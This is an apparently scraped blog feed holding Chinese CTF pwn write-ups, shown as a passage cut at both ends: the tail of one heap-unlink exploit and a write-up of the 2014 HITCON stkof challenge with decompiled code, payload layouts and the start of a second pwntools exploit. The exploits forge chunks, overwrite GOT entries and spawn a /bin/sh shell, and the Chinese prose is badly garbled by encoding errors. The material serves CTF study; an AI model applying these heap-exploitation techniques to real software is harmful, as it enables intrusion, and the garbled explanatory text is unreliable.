io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 1024)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ent:&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B31&#x27;)# new</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BFB&#x27;) # delete</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400CDA&#x27;)#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C89&#x27;)</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,payload)</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:-<span class="number">1</span>])</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">editnote(<span class="number">2</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Integer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink-2014-HITCON-stkof</title>
      <link href="/2023/03/14/Unlink-2014-HITCON-stkof/"/>
      <url>/2023/03/14/Unlink-2014-HITCON-stkof/</url>
      
        <content type="html"><![CDATA[<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>åœ¨freeå †å—æ—¶ï¼Œè¦æ»¡è¶³é‡Šæ”¾çš„è¯¥chunkä¸åœ¨tcache(å¸¦ç€chunkheadï¼Œ0x410)æˆ–fastbin(0x80)èŒƒå›´å†…ï¼Œfreeçš„chunkç‰©ç†åœ°å€å‰æˆ–åæœ‰freechunkæ—¶ä¼šè¿›è¡Œunlinkæ“ä½œï¼Œunlinkå°±æ˜¯æŠŠè¿™ä¸ªchunkä»åŒå‘é“¾è¡¨é‡Œæ‹¿ä¸‹æ¥</p><p>è°ƒç”¨å…³ç³»å¤§è‡´å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">    _int_free()&#123;</span><br><span class="line">        unlink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unlinkæ˜¯ä¸€ä¸ªå®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                      </span><br><span class="line">    BK = P-&gt;bk;                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                      </span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,      </span><br><span class="line">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                   P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                      </span><br><span class="line">          &#125;                                      </span><br><span class="line">      &#125;                                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>Unlinkè¿™é‡Œä¼šæœ‰å‡ ä¸ªæ£€æµ‹</p><ul><li>æ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„prevsizeçš„å€¼æ˜¯å¦ç­‰äºè¢«é‡Šæ”¾chunkçš„sizeå¤§å°</li><li>æ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„sizeçš„Pæ ‡å¿—ä½æ˜¯å¦ä¸º0</li><li>ç»å¸¸è¢«é‡Šæ”¾chunkçš„fdçš„bkæ˜¯å¦æŒ‡å‘pï¼Œè¢«é‡Šæ”¾chunkçš„bkçš„fdæ˜¯å¦æŒ‡å‘p</li></ul><p>æˆ‘ä»¬ç€é‡åˆ†æä¸€ä¸‹è¿™é‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                      </span><br><span class="line">BK = P-&gt;bk;                                      </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"><span class="keyword">else</span> &#123;                                      </span><br><span class="line">    FD-&gt;bk = BK;                                  </span><br><span class="line">    BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ€ä¹ˆç»•è¿‡æ£€æµ‹é€šè¿‡unlinkå®ç°ä»»æ„åœ°å€è¯»å†™å‘¢</p><p>åœ¨64ä½ç¨‹åºä¸‹ï¼Œæˆ‘ä»¬è¢«unlinkçš„chunkæ˜¯P</p><p>æˆ‘ä»¬ä¼ªé€ chunk P </p><p>P-&gt;fd &#x3D; target addr -0x18</p><p>P-&gt;bk &#x3D; expect value</p><p>FD &#x3D; P-&gt;fd &#x3D; target-0x18</p><p>BK &#x3D; P-&gt;bk &#x3D; expect value</p><p><strong>FD-&gt;bk &#x3D; BK â€”&gt;*(target-0x18+0x18)&#x3D;*(P-&gt;fd+0x18)&#x3D;BK&#x3D;expect value</strong>      </p><p><strong>BK-&gt;fd &#x3D; FD â€”&gt;*(expect value+0x10)&#x3D;FD&#x3D;target-0x18&#x3D;P-&gt;fd</strong></p><p>å®ç°äº†ä»»æ„åœ°å€è¯»å†™ä½†æ˜¯æ²¡æœ‰ç»•è¿‡ if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) malloc_printerr (check_action, â€œcorrupted double-linked listâ€, P, AV); </p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦*(FD+0x18)&#x3D;P *(BK+0x10)&#x3D;P</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨å †åœ°å€çš„æŸä¸ªåœ°æ–¹ä¼ªé€ æˆ–è€…æ‰¾åˆ°ä¸€ä¸ªåˆé€‚fake_chunkï¼Œè¿™ä¸ªchunkåœ°å€å¯ä»¥æ³„éœ²å‡ºæ¥ï¼Œä¸”ç¬¦åˆ&#x3D;Pè¦æ±‚ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªåœ°å€å†™åˆ°chunk Pçš„fdå’Œbkï¼Œåœ¨unlinkæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢</p><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥å¾—çŸ¥ï¼Œ</p><ul><li>ç¬¬ä¸€æ­¥*(target)||*(P-&gt;fd+0x18)å†™å…¥expect value||BK</li><li>ç¬¬äºŒæ­¥ä¼šåœ¨*(expect value+0x10)||*(p-&gt;bk+10)å†™å…¥target-0x18||P-&gt;fd</li><li>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥using after freeï¼Œé€šè¿‡ä¿®æ”¹è¯¥åœ°å€å†…å®¹å°±å¯ä»¥å®ç°hook</li></ul><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec stkof</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/stkof&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç¨‹åºé‡Œæœ‰ç”¨çš„åŠŸèƒ½</p><ul><li>allocåˆ†é…å†…å­˜ï¼Œå¹¶å†™åˆ°bssæ®µ0x602140çš„å…¨å±€æ•°ç»„é‡Œ</li><li>freeé‡Šæ”¾å¹¶ç½®é›¶æŒ‡é’ˆï¼Œå¥½è¯„å°¼</li><li>fillå¡«å……ç”³è¯·å †åŒº</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">fill</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„fillæ˜¯æœ‰æ¼æ´çš„ï¼Œæˆ‘ä»¬å¯ä»¥é™å®šå¤§å°çš„å †é‡Œå†™å…¥ä»»æ„å¤§å°çš„æ•°æ®é€ æˆå †æº¢å‡º</p><p><strong>å †æº¢å‡ºç»™äº†æˆ‘ä»¬ä¼ªé€ unlink_chunkçš„æœºä¼šï¼ŒglobalæŒ‡é’ˆæ•°ç»„ç»™äº†æˆ‘ä»¬ä¼ªé€ fd bkç»•è¿‡æ£€æµ‹çš„æœºä¼š</strong></p><h3 id="ç¼“å†²åŒºé—®é¢˜"><a href="#ç¼“å†²åŒºé—®é¢˜" class="headerlink" title="ç¼“å†²åŒºé—®é¢˜"></a>ç¼“å†²åŒºé—®é¢˜</h3><p>alloc(16)<br>alloc(32)<br>alloc(48)</p><p>æˆ‘ä»¬è¿™é‡Œå…ˆallocä¸‰ä¸ªå †å—</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png" alt="image-20230314233831972"></p><p>è¿™é‡Œå‘ç°å¤šäº†ä¸¤ä¸ªå †å—åœ¨alloc(16)ä¸­é—´ï¼Œè¿™æ˜¯å› ä¸ºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºã€‚åœ¨ç¬¬ä¸€ä¸ªmallocæ—¶ï¼Œåˆšå¥½æœ‰fgetå’Œprintf</p><p>ç¬¬ä¸€ä¸ªchunkè¢«åŒ…å›´ä¸å¥½åˆ©ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ç»•è¿‡ç¬¬ä¸€ä¸ª</p><h3 id="å®ç°fillåœ°å€å¯æ§"><a href="#å®ç°fillåœ°å€å¯æ§" class="headerlink" title="å®ç°fillåœ°å€å¯æ§"></a>å®ç°fillåœ°å€å¯æ§</h3><p>è¿™é‡Œæˆ‘ä»¬ç”³è¯·ä¸‰ä¸ªå †å—ï¼Œ</p><p>alloc(0x10)<br>alloc(0x30)<br>alloc(0x80)</p><p>åˆ©ç”¨å †æº¢å‡ºï¼Œå¯ä»¥ä¼ªé€ unlinkâ€”â€”chunkï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨å †å—äºŒä¼ªé€ </p><p>chunkheadéœ€è¦0x10å­—èŠ‚ï¼Œfd bkéœ€è¦0x10å­—èŠ‚ï¼Œåé¢æ•°æ®éœ€è¦0x10å­—èŠ‚ï¼Œç¬¬äºŒä¸ªå †å—è‡³å°‘0x30</p><p>ç¬¬ä¸‰ä¸ªå †å—éœ€è¦åœ¨freeçš„æ—¶å€™å‡ºå‘unlinkæ“ä½œï¼Œéœ€è¦å¤§äºfastbinæœ€å¤§å®¹é‡ï¼Œç”³è¯·0x80å³å¯</p><ul><li>chunkheadä¼ªé€ p64(0x0)+p64(0x30)å³å¯</li><li>fdå’Œbkè¿™é‡Œæˆ‘ä»¬éœ€è¦FD-&gt;bk &#x3D; P &amp;&amp; BK-&gt;fd &#x3D; P<ul><li>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨globaæŒ‡é’ˆæ•°ç»„é‡Œå†…å®¹ä¼ªé€ åŒå‘é“¾è¡¨</li><li>è¿™æ—¶å€™æˆ‘ä»¬çš„ä¼ªé€ unlinkå †P&#x3D;0x0000000002c87450æˆ‘ä»¬é€‰å–0x602138ä½œä¸ºfdåˆšå¥½æ»¡è¶³FD-&gt;bk &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png" alt="image-20230315001634637"></li><li>é€‰å–0x602140ä½œä¸ºbkåˆšå¥½æ»¡è¶³BK-&gt;fd &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png" alt="image-20230315001757168"></li><li>è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…³ç³»FDçš„bkå’ŒBKçš„fdå°±å¥½å…¶ä»–å’Œæˆ‘ä»¬unlinkæ— å…³æ¯”å¦‚è¯´æˆ‘ä»¬FDçš„fdï¼Œæˆ‘ç®¡ä½ æŒ‡å‘è°ï¼Œæˆ‘ä»¬ä¸å…³å¿ƒ</li></ul></li></ul><p>payload&#x3D;p64(0x0)+p64(0x31)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x00)+p64(0x6666)</p><p>ä¼ªé€ å¥½unlinkchunkï¼Œä¼ªé€ chunk3ï¼ŒæŠŠprevsizeæ”¹å†™ä¸ºä¼ªé€ chunkå¤§å°ï¼ŒæŠŠsize <strong>PREV_INUSE</strong>ä½ç½®é›¶</p><p>payload +&#x3D; p64(0x30)+p64(0x90)</p><p>ç„¶åæˆ‘ä»¬å»é‡Šæ”¾chunk3 è§¦å‘unlink</p><p>æŒ‰ç…§æˆ‘ä»¬å…ˆå‰çš„åˆ†æ</p><ul><li>å…ˆæŠŠfd+0x18&#x3D;0x602138+0x18&#x3D;0x602150åœ°å€å†™å…¥bk&#x3D;0x602140</li><li>å†æŠŠbk+0x10&#x3D;0x602140+0x10&#x3D;0x602150åœ°å€å†™å…¥fd&#x3D;0x602138</li></ul><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png" alt="image-20230315002921373"></p><p>å’Œåˆ†æä¸€æ ·</p><h3 id="ä»»æ„åœ°å€è¯»å†™ï¼Œleakæ•°æ®ï¼Œæ‹¿shellèµ°äºº"><a href="#ä»»æ„åœ°å€è¯»å†™ï¼Œleakæ•°æ®ï¼Œæ‹¿shellèµ°äºº" class="headerlink" title="ä»»æ„åœ°å€è¯»å†™ï¼Œleakæ•°æ®ï¼Œæ‹¿shellèµ°äºº"></a>ä»»æ„åœ°å€è¯»å†™ï¼Œleakæ•°æ®ï¼Œæ‹¿shellèµ°äºº</h3><p>è¿™æ ·æˆ‘ä»¬fill chunk2æ—¶å°±å¯ä»¥ï¼Œä¿®æ”¹å…¨å±€æŒ‡é’ˆæ•°ç»„ä¸ºä»»ä½•åœ°å€ï¼Œå†é€šè¿‡fillä¿®æ”¹è¿™ä¸ªåœ°å€ä¸ºä»»ä½•å€¼</p><p>payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)</p><p>edit(2,len(payload),payload)</p><p>è¿™æ ·s[0]&#x3D;free_gotï¼Œs[1]&#x3D;puts_gotï¼Œs[2]&#x3D;atoi_got</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png" alt="image-20230315005329559"></p><p>payload &#x3D; p64(puts_plt)<br>edit(0,len(payload),payload)<br>free(1)</p><p>å…ˆæŠŠfreegotæ”¹ä¸ºputs pltï¼Œè¿™æ ·free(1)&#x3D;&#x3D;puts(puts_got)</p><p>leakå‡ºlibcå</p><p>payload &#x3D; p64(system)<br>edit(2,len(payload),payload)</p><p>æŠŠatoi_gotæ”¹ä¸ºsystemã€‚åˆ©ç”¨choice &#x3D; atoi(nptr);åœ¨è¾“å…¥æ—¶æ„é€ binshå³å¯payload &#x3D; â€˜&#x2F;bin&#x2F;sh\x00â€™<br>io.sendline(payload)</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png" alt="image-20230315010413491"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./stkof&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span 